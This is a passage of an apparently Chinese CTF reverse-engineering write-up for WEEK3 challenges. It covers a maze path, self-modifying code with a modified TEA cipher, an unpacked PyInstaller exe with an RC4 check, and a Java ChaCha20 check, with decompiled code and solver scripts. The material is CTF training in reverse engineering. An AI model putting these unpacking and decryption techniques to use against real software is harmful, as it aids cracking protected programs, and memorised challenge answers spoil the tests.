next_point = gen_nex(<span class="built_in">map</span>, x, y, z)</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> next_point:</span><br><span class="line">        pathn = path + n[<span class="number">3</span>]</span><br><span class="line">        dfs(<span class="built_in">map</span>, n[<span class="number">0</span>], n[<span class="number">1</span>], n[<span class="number">2</span>], pathn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">outpus = <span class="string">&quot;&quot;</span></span><br><span class="line">dfs(maze, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, outpus)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ssdddssuuuwwwwqqqdddduussaauuuaaaaassssqddddddduuwwwaasusssdd</p>
</blockquote>
<p>我们分析最后的函数，可以直接通过动调获取flag</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031183240426.png" alt="image-20231031183240426"></p>
<h3 id="WEEK3-ststst"><a href="#WEEK3-ststst" class="headerlink" title="[WEEK3]ststst"></a>[WEEK3]ststst</h3><p>SMC加tea</p>
<p>我们分析代码，可以看到有一段修改内存的函数，以及赋予内存修改权限的mprotect，我们猜测这就是SMC的自解密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400763</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (sub_400763 - sub_400696); ++i )</span><br><span class="line">    *(sub_400696 + i) ^= <span class="number">0xC3</span>u;</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;dword_400000, <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接动调，然后选中全部的数据按u，然后选中函数头按c和p，就可以编译成一个完整的函数,我们可以看到是一个魔改tea加密，他修改了sum的值，我们用别人的脚本跑一下就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400696</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = *a1;</span><br><span class="line">  v1 = a1[<span class="number">1</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">    v0 += (v1 + sum) ^ (<span class="number">16</span> * v1 + *key) ^ ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">    v1 += (v0 + sum) ^ (<span class="number">16</span> * v0 + key[<span class="number">2</span>]) ^ ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v0;</span><br><span class="line">  result = v1;</span><br><span class="line">  a1[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mary19920410/article/details/71518130">浅析C语言之uint8_t &#x2F; uint16_t &#x2F; uint32_t &#x2F;uint64_t-CSDN博客</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> v3 = v[<span class="number">0</span>];</span><br><span class="line">	<span class="type">uint32_t</span> v4 = v[<span class="number">1</span>];</span><br><span class="line">	<span class="type">uint32_t</span> sum = ((<span class="number">32</span> * (-delta)) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; i++) &#123;</span><br><span class="line">		v4 -= (v3 + sum) ^ (<span class="number">16</span> * v3 + k[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">		v3 -= (v4 + sum) ^ (<span class="number">16</span> * v4 + k[<span class="number">0</span>]) ^ ((v4 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">		sum += <span class="number">0x61C88647</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v3;</span><br><span class="line">	v[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x01234567</span>, <span class="number">0x89ABCDEF</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span> &#125;;</span><br><span class="line">	<span class="type">uint32_t</span> <span class="built_in">array</span>[<span class="number">8</span>] = &#123; <span class="number">0xDB8F2569</span>, <span class="number">0x40CD83E3</span>, <span class="number">0xA033E680</span>, <span class="number">0xFFF7A644</span>,</span><br><span class="line">	<span class="number">0x690C3A17</span>, <span class="number">0xB621B866</span>, <span class="number">0x34E7E2A7</span>, <span class="number">0xAD10A692</span> &#125;; <span class="comment">//密码数据</span></span><br><span class="line">	<span class="type">uint32_t</span> temp[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">		temp[<span class="number">0</span>] = <span class="built_in">array</span>[i];</span><br><span class="line">		temp[<span class="number">1</span>] = <span class="built_in">array</span>[i + <span class="number">1</span>];</span><br><span class="line">		decrypt(temp, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c%c%c%c%c&quot;</span>, *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] +</span><br><span class="line">			<span class="number">1</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">3</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">0</span>), *</span><br><span class="line">			((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WEEK3-easyre"><a href="#WEEK3-easyre" class="headerlink" title="[WEEK3]easyre"></a>[WEEK3]easyre</h3><p>开局一个exe文件，和之前的不同，我们用die看了后是用py打包的，那么我们就解包，反编译</p>
<blockquote>
<p>python pyinstxtractor-ng.py 1.exe<br>uncompyle6 main.pyc &gt; main.py</p>
</blockquote>
<p>我们把其中的main.pyc转换成py代码</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031212031065.png" alt="image-20231031212031065"></p>
<p>用gpt得出他的xor的值是23,我们根据他的代码逻辑，他就会执行一个程序，但我们看不到我们需要的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">encoded_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_decoded_data = <span class="built_in">bytes</span>([byte ^ <span class="number">23</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_data])</span><br><span class="line">decoded_data = base64.b64decode(xor_decoded_data)</span><br><span class="line">code_obj = marshal.loads(decoded_data)</span><br><span class="line">exce(code_obj)</span><br></pre></td></tr></table></figure>

<blockquote>
<p> exec 是 Python 中的一个内置函数，用于执行动态生成的 Python 代码。这个函数接受一个代码对象（通常是由字符串形式的代码或者编译后的字节码构建而成），并执行其中的 Python 语句exec 是 Python 中的一个内置函数，用于执行动态生成的 Python 代码。</p>
</blockquote>
<p>重点，接受一个代码对象，通常是由字符串形式的代码或者编译后的字节码构建而成。</p>
<p>而且前面marshal.loads(decoded_data) 反序列化从某种格式编码的代码。所以现在的encode其实是类似于字节码的存在？因此我们可以直接用dis模块查看code_obj 中包含的 Python 字节码的信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">encoded_data = <span class="string">b&#x27;#`VVVVVVVVVVVVVVVVVVVVVSVVVVFVVVV_YZVVVVMVU|VNFV@pU|V&#123;xUMVYvVzBSMVDSVFRVMFDSV\\VQMV@\x7fVAxPMFU&#123;V@BPp`]vU%B_MF]eVy]VMFY|UxZUVFUbTPBSMVrSVFRVMV\x7fCVT|]N`^VVVVVVVVVVVVVVVpVVVVPVVVVF`VVV_GFVVVVsVU\&#x27;V@FUp`PSVO\&#x27;TMV].V$FUMVPSVBFVOC&quot;.U_`SqV]/UU|VQ`U/V_`RsV]/V^ZUQpVMVUtVMVR@V_\&#x27;SqV]/Vo|VqV]/UU|VVpU/Vy`RGVU/Vy`SGVUoPPFTUVU.U_\&#x27;SsVXSV_\&#x27;QqVQRVQ&amp;pqFM/UPFSQ`U|VENVqFE/V$`TqVFMVUtVMVR@V_\&#x27;SqV]/Vo|VqV]/UU|VVpU/Vy`RGVU/Vy`SGVU/Vy`TqVFMV_`TqVZMVUtVMVR@VU|VqFs/UvVRqVM/U\&#x27;RVxFRUV_QfqVACVT|RCb|VVFVV!FVVVVSgVFVVVT|Q%pEdvOY\&#x27;%pAnN@&quot;yMsxSuPAb%p&#123;~rOE&#123;NO]nNOyvUzQ`tPAbMT|^%pYeMO&#123;vTOUdN@&#123;bsPA#sYxUB.xUvcxUvAx\\N%&#123;`vPAnsPA#sYxRN%\x7f\x7ftcxUv!|Vtp/VVVS!UzM&amp;u~&quot;`rsx[tzZ\&#x27;O%AbN$]&quot;t_FUVVVVto`VVVVVVF`UUV^ZVDVU_V^^VFNTTVRZVEVUPpRNVEVTt\x7fRVVVUmT`VVVPA#N@&amp;`uPAqv%A&quot;tnxVVVSN&#123;U!ez%M\&#x27;!&amp;&amp;VP ez!UZmA.\&#x27;X&quot;g^\&#x27;/NUcvXd.TPRTTD!&amp;UB\\`dT.R&#125;Q&#123;!QQUdr~UguyU&amp;sTU&quot;u$An^PMdN@t!rpA&amp;sPNcXQxSr@Am@p]bu\&#x27;#gT_^EVVVVtp|VVVUvU@YxM@Ye%pA`tz&#123;bsYxQv@&quot;`sOCvUzAbN%.|MsxRMzo\x7fM&amp;x]M@&quot;&#125;ty&#123;`sPA|tp/VVVUnS`VVV_^GVVVVt\x7fVVVVSvTSocu%E&amp;uPB&lt;VFVVV_ZFVVVVTUFRVFFTTVRZVpxTTVR\\Vp**&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_decoded_data = <span class="built_in">bytes</span>([byte ^ <span class="number">23</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_data])</span><br><span class="line">decoded_data = base64.b64decode(xor_decoded_data)</span><br><span class="line">code_obj = marshal.loads(decoded_data)</span><br><span class="line">dis(code_obj)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到字节码后我们直接gpt，转换成正常的py代码，如果gpt是傻子可以尝试第二种方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">encoded_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"></span><br><span class="line">xor_decoded_data = <span class="built_in">bytes</span>([byte ^ <span class="number">23</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_data])</span><br><span class="line"></span><br><span class="line">decoded_data = base64.b64decode(xor_decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;new.pyc&quot;</span>,<span class="string">&quot;wb&quot;</span>).write(decoded_data)</span><br></pre></td></tr></table></figure>

<p>将他写入到一个文件里面，然后现在还识别不出他是pyc文件，我们去直接反编译出的pyc里面，随便偷个头过来，将他修复（上面的一串）</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031214116370.png" alt="image-20231031214116370"></p>
<p>然后再uncompyle6 new.pyc &gt; 1.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: fun.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        ciphertext = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">            k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">            ciphertext.append(char ^ k)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(ciphertext)  <span class="comment">#这一段是我自己加的，直接自己调用自己就可以了</span></span><br><span class="line">            <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;example_key&#x27;</span></span><br><span class="line">check = <span class="string">b&#x27;\xd8\x94\x1e\xab\x9bft\xeb]@\x1b\xba\xe6\xe8\x133W\xdd\x0e\xe6\x924\xf1\x80mh\xeb=\x08a\x02\t.\xb5\x05B\xb0\xb0/D\x8cY&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Plz input your flag:&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">encrypted = rc4_encrypt(key, flag)</span><br><span class="line"><span class="keyword">if</span> encrypted == check:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling C:\Users\a\Desktop\new.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到就是一个rc4，我们让他自己调用自己就可以解出flag了</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031214441502.png" alt="image-20231031214441502"></p>
<h3 id="WEEK3-java是最棒的语言吗"><a href="#WEEK3-java是最棒的语言吗" class="headerlink" title="[WEEK3]java是最棒的语言吗"></a>[WEEK3]java是最棒的语言吗</h3><p>将原来的java拷贝下俩，加两处输出，获得密文和密钥，最后异或一下获得flag</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: ChaCha20  reason: default package */</span></span><br><span class="line"><span class="comment">/* loaded from: java是最棒的语言吗.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChaCha20</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nextLine</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(encrypt(nextLine.getBytes(StandardCharsets.UTF_8), <span class="string">&quot;Shctf_Welcomes_Have_4_good_t1me_&quot;</span>.getBytes(), <span class="string">&quot;HsehrcOedfgs&quot;</span>.getBytes()), hexStringToBytes(<span class="string">&quot;ce43283af73d106815fe5293b474f5309d44063c7fde19533300c60603dfe528d19aee2f6db615191e45&quot;</span>))) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] bArr, <span class="type">byte</span>[] bArr2, <span class="type">byte</span>[] bArr3) &#123;</span><br><span class="line">        <span class="type">int</span>[] chachaInit = chachaInit(bArr2, bArr3);</span><br><span class="line">        <span class="type">byte</span>[] bArr4 = <span class="keyword">new</span> <span class="title class_">byte</span>[bArr.length];</span><br><span class="line">        <span class="type">byte</span>[] bArr5 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArr.length; i += <span class="number">64</span>) &#123;</span><br><span class="line">            chachaBlock(chachaInit, bArr5);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">64</span> &amp;&amp; i + i2 &lt; bArr.length; i2++) &#123;</span><br><span class="line">                bArr4[i + i2] = (<span class="type">byte</span>) (bArr[i + i2] ^ bArr5[i2]);</span><br><span class="line">                System.out.print(bArr5[i2] + <span class="string">&quot;,&quot;</span>); ##这里是添加的</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            chachaInit[<span class="number">12</span>] = chachaInit[<span class="number">12</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] chachaInit(<span class="type">byte</span>[] bArr, <span class="type">byte</span>[] bArr2) &#123;</span><br><span class="line">        <span class="type">int</span>[] iArr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">        iArr[<span class="number">0</span>] = <span class="number">1634760805</span>;</span><br><span class="line">        iArr[<span class="number">1</span>] = <span class="number">857760878</span>;</span><br><span class="line">        iArr[<span class="number">2</span>] = <span class="number">2036477234</span>;</span><br><span class="line">        iArr[<span class="number">3</span>] = <span class="number">1797285236</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            iArr[<span class="number">4</span> + i] = bytesToIntLittleEndian(bArr, i * <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        iArr[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">        iArr[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">        iArr[<span class="number">14</span>] = bytesToIntLittleEndian(bArr2, <span class="number">0</span>);</span><br><span class="line">        iArr[<span class="number">15</span>] = bytesToIntLittleEndian(bArr2, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> iArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">chachaBlock</span><span class="params">(<span class="type">int</span>[] iArr, <span class="type">byte</span>[] bArr)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] copyOf = Arrays.copyOf(iArr, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            chachaDoubleRound(copyOf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">16</span>; i2++) &#123;</span><br><span class="line">            intToBytesLittleEndian(iArr[i2] + copyOf[i2], bArr, i2 * <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">chachaDoubleRound</span><span class="params">(<span class="type">int</span>[] iArr)</span> &#123;</span><br><span class="line">        quarterRound(iArr, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>);</span><br><span class="line">        quarterRound(iArr, <span 